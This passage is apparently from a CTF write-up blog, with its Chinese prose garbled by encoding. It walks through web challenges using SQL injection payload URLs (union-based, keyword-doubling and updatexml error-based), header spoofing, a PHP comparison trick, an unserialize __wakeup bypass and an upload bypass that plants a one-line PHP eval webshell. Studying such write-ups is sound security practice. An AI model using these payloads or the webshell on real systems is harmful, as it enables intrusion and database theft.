class="line">PCFET0NUWVBFIGh0bWw+Cgo8aHRtbD4KCiAgICA8aGVhZD4KICAgICAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgICAgICAgPHRpdGxlPkZMQUc8L3RpdGxlPgogICAgPC9oZWFkPgoKICAgIDxib2R5IHN0eWxlPSJiYWNrZ3JvdW5kLWNvbG9yOmJsYWNrOyI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPGgxIHN0eWxlPSJmb250LWZhbWlseTp2ZXJkYW5hO2NvbG9yOnJlZDt0ZXh0LWFsaWduOmNlbnRlcjsiPuWViuWTiO+8geS9oOaJvuWIsOaIkeS6hu+8geWPr+aYr+S9oOeci+S4jeWIsOaIkVFBUX5+fjwvaDE+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPHAgc3R5bGU9ImZvbnQtZmFtaWx5OmFyaWFsO2NvbG9yOnJlZDtmb250LXNpemU6MjBweDt0ZXh0LWFsaWduOmNlbnRlcjsiPgogICAgICAgICAgICA8P3BocAogICAgICAgICAgICAgICAgZWNobyAi5oiR5bCx5Zyo6L+Z6YeMIjsKICAgICAgICAgICAgICAgICRmbGFnID0gJ2ZsYWd7ZjNhOTMxZDAtODU3OS00NGJiLThiODctMjYxODRiYWZmYzlkfSc7CiAgICAgICAgICAgICAgICAkc2VjcmV0ID0gJ2ppQW5nX0x1eXVhbl93NG50c19hX2cxcklmcmkzbmQnCiAgICAgICAgICAgID8+CiAgICAgICAgPC9wPgogICAgPC9ib2R5PgoKPC9odG1sPgo=</span><br></pre></td></tr></table></figure><p>è§£ç ä¹‹åæ˜¯è¿™æ ·çš„</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">        &lt;title&gt;FLAG&lt;&#x2F;title&gt;</span><br><span class="line">    &lt;&#x2F;head&gt;</span><br><span class="line"></span><br><span class="line">    &lt;body style&#x3D;&quot;background-color:black;&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">        </span><br><span class="line">        &lt;h1 style&#x3D;&quot;font-family:verdana;color:red;text-align:center;&quot;&gt;å•Šå“ˆï¼ä½ æ‰¾åˆ°æˆ‘äº†ï¼å¯æ˜¯ä½ çœ‹ä¸åˆ°æˆ‘QAQ~~~&lt;&#x2F;h1&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">        </span><br><span class="line">        &lt;p style&#x3D;&quot;font-family:arial;color:red;font-size:20px;text-align:center;&quot;&gt;</span><br><span class="line">            &lt;?php</span><br><span class="line">                echo &quot;æˆ‘å°±åœ¨è¿™é‡Œ&quot;;</span><br><span class="line">                $flag &#x3D; &#39;flag&#123;f3a931d0-8579-44bb-8b87-26184baffc9d&#125;&#39;;</span><br><span class="line">                $secret &#x3D; &#39;jiAng_Luyuan_w4nts_a_g1rIfri3nd&#39;</span><br><span class="line">            ?&gt;</span><br><span class="line">        &lt;&#x2F;p&gt;</span><br><span class="line">    &lt;&#x2F;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æˆåŠŸæ‹¿åˆ° flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;f3a931d0-8579-44bb-8b87-26184baffc9d&#125;</span><br></pre></td></tr></table></figure><h3 id="LoveSQL"><a href="#LoveSQL" class="headerlink" title="LoveSQL"></a>LoveSQL</h3><p><span style="padding: 0.25rem 0.375rem;background-color: #185c37;color: #fff;font-size: 0.75rem;margin-right: 5px;">SQL Injection</span></p><p>ä¸€å¦‚æ—¢å¾€ç†Ÿæ‚‰çš„ç•Œé¢ï¼Œéšæ‰‹è¾“äº†ä¸ª <code>admin' #</code> å°±ç™»è¿›å»äº†ï¼Œä½†æ˜¯é™¤äº†ä¸€è¡Œå­—å•¥ä¹Ÿæ²¡æœ‰ <code>Your password is 'fbc72bd807fe8419b27393707199b18e'</code>ã€‚äºæ˜¯é€€å›å»è¯•äº†ä¸€æ³¢å¸¸è§„æ“ä½œï¼Œæ„é€ ä¸€ä¸ªè¿™æ ·çš„ payload <code>.../check.php?username=nullnull%27%20union%20select%201%2Cgroup_concat(table_name)%2C3%20from%20information_schema.tables%20where%20table_schema=database()%20%23&password=123</code> æˆåŠŸçˆ†å‡ºäº†è¡¨ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Hello geekuser,l0ve1ysq1ï¼</span><br><span class="line">Your password is &#39;3&#39;</span><br></pre></td></tr></table></figure><p>äºæ˜¯ç»§ç»­å¸¸è§„æ“ä½œï¼Œ<code>.../check.php?username=nullnull%27%20union%20select%201%2Cgroup_concat(column_name)%2C3%20from%20information_schema.columns%20where%20table_schema=database()%20%23&password=123</code> æˆåŠŸçˆ†å‡ºåˆ—ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hello id,username,password,id,username,passwordï¼</span><br></pre></td></tr></table></figure><p>åˆ°è¿™é‡Œæˆ‘æ‡µäº†ä¸€ä¼šå„¿ï¼Œä»–æ²¡æœ‰ flag å•¥çš„åˆ—ï¼Œæˆ‘è¿˜ä»¥ä¸ºæ‰¾é”™åœ°æ–¹äº†ã€‚åæ¥è¯•äº†è¯• password å‘ç°æˆ‘æƒ³å¤šäº†ã€‚ç”¨ <code>.../check.php?username=nullnull%27%20union%20select%201%2Cgroup_concat(password)%2C3%20from%20l0ve1ysq1%20%23&password=123</code> æˆåŠŸæ‹¿åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;e3d9d46f-a313-45bf-86b8-31b46fa246ce&#125;</span><br></pre></td></tr></table></figure><h3 id="Http"><a href="#Http" class="headerlink" title="Http"></a>Http</h3><p><span style="padding: 0.25rem 0.375rem;background-color: #103f91;color: #fff;font-size: 0.75rem;margin-right: 5px;">Headers</span></p><p>è¿™é¢˜çš„ç½‘é¡µè®¾è®¡ç»ˆäºå¥½çœ‹å†™äº†OwO  ä¸Šæ¥æ²¡çœ‹åˆ°å•¥ï¼Œæ‰€ä»¥å°±çœ‹äº†ä¸€æ‰‹æºç ï¼Œæ‰¾åˆ°äº† <code>Secret.php</code>ã€‚ç›´æ¥è®¿é—®ä¸€æ³¢ï¼Œç„¶åè·Ÿç€å„ç§æç¤ºï¼Œæ·»åŠ å¦‚ä¸‹ headerã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: localhost</span><br><span class="line">User-Agent: Syclover</span><br><span class="line">Referer: https:&#x2F;&#x2F;www.Sycseret.com</span><br></pre></td></tr></table></figure><p>è®¿é—®ä¹‹åæˆåŠŸæ‹¿åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;39ca0d2c-d886-456e-ad91-98f1bf1fe95c&#125;</span><br></pre></td></tr></table></figure><h3 id="BabySQL"><a href="#BabySQL" class="headerlink" title="BabySQL"></a>BabySQL</h3><p><span style="padding: 0.25rem 0.375rem;background-color: #185c37;color: #fff;font-size: 0.75rem;margin-right: 5px;">SQL Injection</span></p><p>ä¾æ—§æ˜¯ç†Ÿæ‚‰çš„é…æ–¹ï¼Œä¸Šæ‰‹æ‹¿ç€ä¸Šæ¬¡çš„ payload è¯•äº†ä¸€æ‰‹ï¼Œå‘ç°æŠ¥é”™äº†ï¼Œç„¶åæ¢äº†ä¸ªç®€å•çš„ <code>.../check.php?username=nullnull%27%20or%201=1%20%23&password=123</code> ä¾æ—§æŠ¥é”™äº†ã€‚ä»”ç»†çœ‹çœ‹æŠ¥é”™ï¼Œå‘ç°æˆ‘è¯­å¥é‡Œçš„ <code>or</code> æ²¡äº†ã€‚æŸ¥äº†ä¸€æ³¢èµ„æ–™ï¼Œå¾—çŸ¥å¯ä»¥åŒå†™å…³é”®å­—æ¥ç»•è¿‡è¿‡æ»¤ã€‚äºæ˜¯è¯•äº†ä¸€æ‰‹ <code>.../check.php?username=nullnull%27%20oorr%201=1%20%23&password=123</code> å‘ç°ç™»å½•æˆåŠŸäº†ã€‚äºæ˜¯ç…§ç€å‰é¢çš„ payload åŒå†™å…³é”®å­—ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">...&#x2F;check.php?username&#x3D;nullnull%27%20ununionion%20selselectect%201%2Cgroup_concat(table_name)%2C3%20frfromom%20infoorrmation_schema.tables%20whwhereere%20table_schema&#x3D;database()%20%23&amp;password&#x3D;123</span><br><span class="line"></span><br><span class="line">Hello b4bsql,geekuserï¼</span><br><span class="line">Your password is &#39;3&#39;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">...&#x2F;check.php?username&#x3D;nullnull%27%20ununionion%20selselectect%201%2Cgroup_concat(column_name)%2C3%20frfromom%20infoorrmation_schema.columns%20whwhereere%20table_schema&#x3D;database()%20%23&amp;password&#x3D;123</span><br><span class="line"></span><br><span class="line">Hello id,username,password,id,username,passwordï¼</span><br><span class="line">Your password is &#39;3&#39;</span><br></pre></td></tr></table></figure><p>æœ€åç”¨ <code>.../check.php?username=nullnull%27%20ununionion%20selselectect%201%2Cgroup_concat(passwoorrd)%2C3%20frfromom%20b4bsql%20%23&password=123</code> æˆåŠŸæ‹¿åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;e53f0586-f83e-4183-8dba-c12dc4a84383&#125;</span><br></pre></td></tr></table></figure><h3 id="HardSQL"><a href="#HardSQL" class="headerlink" title="HardSQL"></a>HardSQL</h3><p><span style="padding: 0.25rem 0.375rem;background-color: #185c37;color: #fff;font-size: 0.75rem;margin-right: 5px;">SQL Injection</span></p><p>è¿™é¢˜ç”¨è€å¥—è·¯ä¸Šå»å°±è¢«æ€¼â€œè‡­å¼Ÿå¼Ÿâ€äº†ï¼Œè¯•äº†ä¸€æ‰‹ï¼Œå‘ç°å¤§éƒ¨åˆ†å…³é”®å­—å¥½åƒè¿˜åœ¨ï¼Œä½†æ˜¯ç©ºæ ¼å•¥çš„ç¬¦å·éƒ½æ²¡äº†ï¼Œ <code>union</code> è¿™ä¸ªå…³é”®å­—ä¹Ÿæ²¡äº†ã€‚äºæ˜¯å°±æƒ³ç€èµ°æŠ¥é”™æ³¨å…¥çš„æ€è·¯äº†ã€‚</p><p>ä¸€å¼€å§‹ç–¯ç‹‚æŠ¥é”™ï¼ˆæ²¡ç”¨çš„é‚£ç§ï¼‰ï¼Œç„¶åå»è¡¥äº†ä¸€æ³¢æŠ¥é”™æ³¨å…¥çš„çŸ¥è¯†ç‚¹ã€‚ç„¶åæ•´äº†ä¸ªç®€å•çš„è¯•äº†è¯• <code>.../check.php?username=admin%27or(updatexml(1,concat(user(),0x7e,version()),1))%23&password=123</code> ç„¶åå‘ç°æœ‰äº†å›æ˜¾ <code>XPATH syntax error: '@localhost~10.3.18-MariaDB'</code>ã€‚äºæ˜¯ç…§ç€æ•´äº†ä¸ªçˆ†è¡¨çš„ payload <code>.../check.php?username=<br>admin%27or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))%23&password=123</code> æˆåŠŸæ‹¿åˆ°è¡¨ <code>H4rDsq1</code>ã€‚</p><p>ä¾ç…§å¥—è·¯ï¼Œç”¨ <code>.../check.php?username=<br>admin%27or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_schema)like(database())),0x7e),1))%23&password=123</code> æˆåŠŸæ‹¿åˆ°åˆ— <code>id,username,password</code>ã€‚</p><p>æœ€åï¼Œç”¨ <code>.../check.php?username=<br>admin%27or(updatexml(1,concat(0x7e,(select(group_concat(password))from(H4rDsq1)),0x7e),1))%23&password=123</code> æ‹¿åˆ°äº†åŠä¸ª flag <code>flag&#123;128c8f16-6d62-4b41-b632-ba</code>  ï¼ˆ<del>æäººå¿ƒæ€æˆåŠŸ</del>ï¼‰</p><p>å†æ¬¡æŸ¥äº†ä¸€æ³¢ï¼Œç”¨ä¸ª <code>right()</code> æ‹¿åˆ°äº†å¦ä¸€åŠï¼Œ <code>.../check.php?username=<br>admin%27or(updatexml(1,concat(0x7e,(select(right(group_concat(password),20))from(H4rDsq1)),0x7e),1))%23&password=123</code>ã€‚æœ€åæ‹¼æ¥èµ·æ¥ï¼ŒæˆåŠŸæ‹¿åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;128c8f16-6d62-4b41-b632-ba18b718684a&#125;</span><br></pre></td></tr></table></figure><h3 id="BuyFlag"><a href="#BuyFlag" class="headerlink" title="BuyFlag"></a>BuyFlag</h3><p><span style="padding: 0.25rem 0.375rem;background-color: #103f91;color: #fff;font-size: 0.75rem;margin-right: 5px;">Cookie</span><span style="padding: 0.25rem 0.375rem;background-color: #641790;color: #fff;font-size: 0.75rem;margin-right: 5px;">POST &amp; GET Trick</span></p><p>è¿™é¢˜ä¸Šæ¥ç»™äº†ä¸ªå¾ˆåƒ Http é‚£é¢˜çš„ç½‘é¡µï¼Œäºæ˜¯å°±çœ‹äº†ä¸€æ‰‹æºç ï¼ŒæˆåŠŸæ‰¾åˆ°å…¥å£ <code>pay.php</code>ã€‚è¿›å»ä¹‹åä¾æ—§æ²¡ä»€ä¹ˆå¤´ç»ªâ€”â€”å®Œå…¨æ²¡æœ‰å¯ä»¥è¾“å…¥çš„åœ°æ–¹ã€‚å€’æ˜¯ç½‘é¡µæœ¬èº«ç»™äº†ä¸å°‘æç¤ºï¼Œäºæ˜¯çœ‹äº†ä¸€æ‰‹æºç ï¼Œå‘ç°äº†ä¸€æ®µæ³¨é‡Šã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">~~~post money and password~~~</span><br><span class="line">if (isset($_POST[&#39;password&#39;])) &#123;</span><br><span class="line">$password &#x3D; $_POST[&#39;password&#39;];</span><br><span class="line">if (is_numeric($password)) &#123;</span><br><span class="line">echo &quot;password can&#39;t be number&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">&#125;elseif ($password &#x3D;&#x3D; 404) &#123;</span><br><span class="line">echo &quot;Password Right!&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><p>äºæ˜¯æ„é€ äº†ä¸€ä¸ªå‚æ•° <code>password=404%250</code> ï¼ŒPOST è¿‡å»ä¹‹åå¥½åƒæ²¡å•¥ååº”ã€‚å…¶å®æ˜¯å®ƒçš„ Cookie é‡Œè¿˜æœ‰ç‚¹ä¸œè¥¿ï¼ŒæŠŠ Cookie çš„ <code>user:0</code> æ”¹æˆ <code>user:1</code> ä¹‹åå‡ºç°äº†æ–°çš„æç¤ºã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">you are Cuiter</span><br><span class="line">Password Right!</span><br><span class="line">Pay for the flag!!!hacker!!!</span><br></pre></td></tr></table></figure><p>äºæ˜¯æ¥ç€æ„é€  POST çš„å‚æ•° <code>money=1000000000</code> ï¼Œç»“æœå¾—åˆ°äº†æ•°å­—è¿‡é•¿çš„æç¤º <code>Nember lenth is too long</code> ã€‚åˆ°è¿™ä¸ªåœ°æ–¹æˆ‘çªç„¶æœ‰ç‚¹è¿·äº†ï¼Œäºæ˜¯å»é—®äº†<a href="https://duitutu.cn">å †å †</a>ï¼Œç»“æœä»–è¯´ä»–çŒœå‡ºæ¥è¿™æ˜¯ strcmp çš„æ¼æ´ï¼ˆæˆ‘çœŸçš„çŒœä¸å‡ºï¼‰ï¼Œäºæ˜¯æ„é€ ä¸€æ³¢å‚æ•° <code>money[]=1</code> ã€‚<span class="HighlightWKT7BlueGreen">è¿™ä¸ªåœ°æ–¹ç”¨ç§‘å­¦è®¡æ•°æ³•ä¹Ÿå¯ä»¥æ„é€ ï¼Œå†™ä½œ <code>money=1e9</code> ï¼Œè¿™æ ·è§£é‡Šæ›´åŠ å¥½ä¸€äº›ã€‚</span>ï¼ˆvia <a href="https://duitutu.cn">å †å †</a>ï¼‰</p><p>æœ€åç”¨ <code>password=404%250&money[]=1</code> çš„å‚æ•°æˆåŠŸæ‹¿åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;40e309cf-6975-439d-912d-0c66009cd05e&#125;</span><br></pre></td></tr></table></figure><h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><p><span style="padding: 0.25rem 0.375rem;background-color: #185c37;color: #fff;font-size: 0.75rem;margin-right: 5px;">Source Leak</span><span style="padding: 0.25rem 0.375rem;background-color: #185c37;color: #fff;font-size: 0.75rem;margin-right: 5px;">Unserialize</span></p><p>æ‰“å¼€ä¹‹åçœ‹åˆ°äº†ä¸€åªçŒ«çŒ«ï¼Œå¯ä»¥ç”¨é¼ æ ‡æ“æ§æ¯›çº¿çƒé€—å®ƒç©ï¼Œé¡µé¢ä¸Šæ–¹è¿˜æœ‰â€œå¤‡ä»½â€çš„æç¤ºã€‚äºæ˜¯å’±ç”¨ wwwscan æ‰«æäº†ä¸€ä¸‹ï¼Œé¡ºåˆ©ä¸‹è½½åˆ°äº† <code>.../<a href="http://www.zip/">www.zip</a></code>ã€‚çœ‹äº†ä¸€ä¸‹æ–‡ä»¶ï¼Œå‘ç°ä»¥ä¸‹ä¸»è¦ä»£ç ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="variable">$select</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;select&#x27;</span>];</span><br><span class="line"><span class="variable">$res</span>=unserialize(@<span class="variable">$select</span>);</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//class.php</span></span><br><span class="line">...</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;password != <span class="number">100</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You name is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;username;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You password is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;password;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line"></span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>å¾ˆæ˜æ˜¾è¿™é‡Œè€ƒäº†ä¸€ä¸ªååºåˆ—åŒ–çš„æ“ä½œï¼Œæˆ‘æŠŠä»–çš„ä»£ç ç¨ä½œä¿®æ”¹ï¼Œçœ‹äº†ä¸€ä¸‹åºåˆ—åŒ–çš„ç»“æœã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> serialize(<span class="keyword">new</span> Name(<span class="string">&#x27;admin&#x27;</span>,<span class="number">100</span>));</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span> = <span class="string">&#x27;yesyes&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;password != <span class="number">100</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¾“å‡ºçš„ç»“æœæ˜¯ <code>O:4:"Name":2:&#123;s:14:" Name username";s:5:"admin";s:14:" Name password";i:100;&#125;</code>ã€‚å› ä¸ºè¿˜è¦ç»•è¿‡ <code>__wakeup()</code>ï¼Œæ‰€ä»¥è¦æŠŠä¸Šè¿°è¾“å‡ºçš„ 2 æ”¹æˆ 3 æˆ–è€…ä¸€ä¸ªæ›´å¤§çš„æ•°ã€‚ç„¶åå› ä¸º username å’Œ password éƒ½æ˜¯ç§æœ‰æˆå‘˜ï¼Œæ‰€ä»¥æŠŠç±»åå’Œæˆå‘˜åå‰é¢ä»¥ç©ºæ ¼è¾“å‡ºçš„ null å­—ç¬¦æ¢æˆ \0ã€‚</p><p>æœ€åå°†è¯·æ±‚ url æ‹¼æ¥èµ·æ¥ <code>.../?select=O:4:"Name":2:&#123;s:14:"\0Name\0username";s:5:"admin";s:14:"\0Name\0password";i:100;&#125;</code>ã€‚ä½¿ç”¨ Python çš„ Requests åº“è®¿é—®ï¼ŒæˆåŠŸæ‹¿åˆ° flagã€‚ï¼ˆæˆ‘ä¹Ÿä¸çŸ¥é“ä¸ºä»€ä¹ˆç›´æ¥ HackBar è®¿é—®ä¸æ˜¾ç¤º flagï¼‰</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;14414a53-1fe9-4623-a67b-07b581d4bbcb&#125;</span><br></pre></td></tr></table></figure><h3 id="Knife"><a href="#Knife" class="headerlink" title="Knife"></a>Knife</h3><p>è¿™é¢˜å¾ˆæ˜æ˜¾åœ°æç¤ºäº†ä½¿ç”¨ä¸€æ³¢èœåˆ€ï¼Œäºæ˜¯æœæ–­ç”¨èœåˆ€è¿ä¸Šå»ã€‚ä¸€å¼€å§‹ç”¨èœåˆ€çš„æ–‡ä»¶ç®¡ç†æ‰¾äº†å¾ˆä¹…ï¼Œå¹¶æ²¡æœ‰æ‰¾åˆ° flagã€‚äºæ˜¯å°±æ‰“å¼€äº†ä¸€æ³¢è™šæ‹Ÿç»ˆç«¯ï¼Œæ•´äº†ä¸€æ³¢ <code>find / -name flag</code>ã€‚åœ¨ä¸€å † Permission Denied åˆ·è¿‡ä¹‹åæ‰¾åˆ°äº† <code>/flag</code>ã€‚ç„¶åæ‰§è¡Œä¸€æ³¢ <code>cat /flag</code> å°±æˆåŠŸåœ°æ‹¿åˆ°äº† flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;3d1c3437-1ea2-45ea-9660-5d304e2b43c5&#125;</span><br></pre></td></tr></table></figure><h3 id="Upload"><a href="#Upload" class="headerlink" title="Upload"></a>Upload</h3><p><span style="padding: 0.25rem 0.375rem;background-color: #185c37;color: #fff;font-size: 0.75rem;margin-right: 5px;">Upload</span></p><p>æ‰“å¼€ä¹‹åæ˜¯ä¸ªæœ´ç´ çš„ä¸Šä¼ ç•Œé¢ï¼Œé¦–å…ˆéšä¾¿å†™äº†å¥ <code>phpinfo</code> ä¼ªè£…æˆ png ä¼ ä¸Šå»ï¼Œç»“æœæç¤ºä¸èƒ½å«æœ‰å­—ç¬¦ <code>&lt;?</code>ï¼Œäºæ˜¯æœæ–­æ¢äº†ä¸€ç§åªæœ‰ php 5.x å¯ä»¥æ‰§è¡Œçš„æ ¼å¼ï¼ˆäº‹å®è¯æ˜è¿˜æ˜¯ç®¡çš„ï¼‰ï¼Œä½†æ˜¯ä¾æ—§è¢«è¯†åˆ«äº†ã€‚ä¸€ç•ªæŸ¥æ‰¾ä¹‹ååœ¨æ–‡ä»¶å¤´éƒ¨åŠ ä¸Šäº† <code>GIF89a?</code> æˆåŠŸè¿‡æ‰è¿™ä¸€ä¸ªç‚¹ã€‚ç»“æœåœ¨æ”¹æ‹“å±•åçš„æ—¶å€™åˆå¤±è´¥äº†ï¼Œæç¤ºä¸èƒ½ç”¨ <code>.php</code> æ‹“å±•åã€‚æœç´¢äº†ä¸€æ³¢å‘ç°å¯ä»¥ç”¨ <code>.phtml</code> è¿™ä¸ªåç¼€ã€‚äºæ˜¯ä¸€ç•ªä¿®æ”¹ä¹‹åï¼Œâ€œå›¾ç‰‡â€ä¼ äº†ä¸Šå»ï¼Œä¸€å¥è¯æœ¨é©¬å¾—ä»¥æ‰§è¡Œã€‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a?</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&quot;php&quot;</span>&gt;</span><span class="javascript"><span class="built_in">eval</span>($_POST[<span class="string">&#x27;Citrone&#x27;</span>])</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ç”¨èœåˆ€è¿ä¸Šä¹‹åï¼Œè¿›è™šæ‹Ÿç»ˆç«¯é‡Œç›´æ¥ <code>cat /flag</code> å°±èƒ½å¾—åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span 